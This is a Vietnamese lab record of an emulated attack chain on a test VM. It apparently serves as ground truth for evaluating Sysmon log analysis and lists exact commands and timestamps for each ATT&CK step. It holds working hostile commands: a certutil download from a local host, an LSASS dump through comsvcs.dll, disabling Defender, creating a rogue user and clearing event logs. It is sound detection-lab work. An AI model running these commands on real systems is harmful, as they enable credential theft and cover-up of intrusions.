# Tuần 7 — T1: Bảng thời gian chuỗi tấn công (bản làm lại)

Múi giờ: UTC+7. Máy ảo: DACN-LAB.

| Bước | Mã kỹ thuật | Lệnh đã chạy | Giờ bắt đầu (UTC+7) | Giờ kết thúc (UTC+7) | Kết quả | Ghi chú |
|---|---|---|---|---|---|---|
| 0 (chuẩn bị) | — | `wevtutil cl Microsoft-Windows-Sysmon/Operational` | 2026-11-25 00:08:04 | 2026-11-25 00:08:04 | Thành công | **Không phải bước tấn công** — chỉ xoá log cũ trước khi bắt đầu chuỗi, để file không lẫn dữ liệu ngày 18–19/11. Lệnh này vẫn để lại 1 dấu vết tiến trình `wevtutil.exe` trong log cuối cùng (do Sysmon ghi Event 1 cho tiến trình này trước khi kịp bị chính lệnh xoá log xoá theo); agent có thể hiểu nhầm đây là hành vi T1070.001 nên cần loại trừ khỏi chuỗi 6 bước khi đánh giá. |
| 1 | T1105 | `certutil -urlcache -split -f http://192.168.159.1:8000/a.txt a.txt` | 2026-11-25 00:08:56 | 2026-11-25 00:08:56 | Thành công | Tải từ server tạm dựng trên máy thật (python -m http.server) |
| 2 | T1059.001 | `Invoke-AtomicTest T1059.001 -TestNumbers 17` | 2026-11-25 00:09:23 | 2026-11-25 00:09:29 | Thành công | Test 1 (Mimikatz) bị Windows Defender chặn trước đó, đổi sang test 17 |
| 3 | T1547.001 | `Invoke-AtomicTest T1547.001 -TestNumbers 1` | 2026-11-25 00:10:01 | 2026-11-25 00:10:02 | Thành công | |
| 4 | T1136.001 | `net user dacntest "MatKhauThu123!" /add` | 2026-11-25 00:10:20 | 2026-11-25 00:10:20 | Thành công | Dùng lệnh thủ công, không dùng New-LocalUser (Sysmon không thấy lệnh này) |
| 5 | T1003.001 | `Invoke-AtomicTest T1003.001 -TestNumbers 2` | 2026-11-25 00:11:15 | 2026-11-25 00:11:17 | Thành công | Test 1 (ProcDump) và lần chạy test 2 trước đó đều bị chặn/không tạo dump; lần này đã tắt LSA Protection (Core isolation) trước và khởi động lại máy ảo. Xác nhận có file `%TEMP%\lsass-comsvcs.dmp` (75 MB) và sự kiện Event 10 (SourceImage: rundll32.exe → TargetImage: lsass.exe, GrantedAccess 0x1FFFFF, call trace qua comsvcs.dll) |
| 6 | T1070.001 | `wevtutil cl Application` | 2026-11-25 00:12:15 | 2026-11-25 00:12:15 | Thành công | Đổi từ xoá log Sysmon sang xoá log Application theo yêu cầu của Khôi, để giữ lại dấu vết Sysmon của toàn bộ chuỗi |

## Ghi chú khác

- Trước khi bắt đầu chuỗi, đã chạy `wevtutil cl Microsoft-Windows-Sysmon/Operational` để file log chỉ chứa đúng chuỗi lần này, không lẫn dữ liệu test ngày 18–19/11.
- Log Sysmon được xuất ra **sau** bước 6 (không phải trước như lần đầu). Lệnh gõ lần đầu là `wevtutil epl Microsoft-Windows-Sysmon/Operational C:\DACN\log\tuan7-t1-chuoi-tan-cong.evtx` (không có `/ow:true`) nhưng lỗi "The file exists" vì file cũ (13.7 MB, bản lần trước) chưa xoá; chạy lại có thêm `/ow:true` thì thành công và ghi đè file. Dấu vết CommandLine của tiến trình `wevtutil.exe` ghi trong log cuối cùng lại khớp với **lần gõ đầu (không có `/ow:true`)**, nên bảng này ghi đúng theo lệnh không có `/ow:true` để khớp với log thật.
  File kết quả: 1,118,208 byte (1.1 MB), SHA256: `5aacb87dc26650551a7cbcc05c0dd71ec5d91ebf5262c77f86144c78028d4c1b`.
- Trong lúc chạy Bước 3 và Bước 5, đã tắt tạm Windows Defender (Tamper Protection qua Windows Security, Real-time protection qua `Set-MpPreference -DisableRealtimeMonitoring $true`) vì Defender chặn các công cụ dump LSASS mặc định. Đã bật lại Defender sau khi dọn máy ảo.
- Dọn máy ảo sau khi hoàn tất: xoá khoá Run (`Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup`), xoá user `dacntest` (`net user dacntest /delete`), xoá file `lsass-comsvcs.dmp` và `a.txt` trong `%TEMP%`.
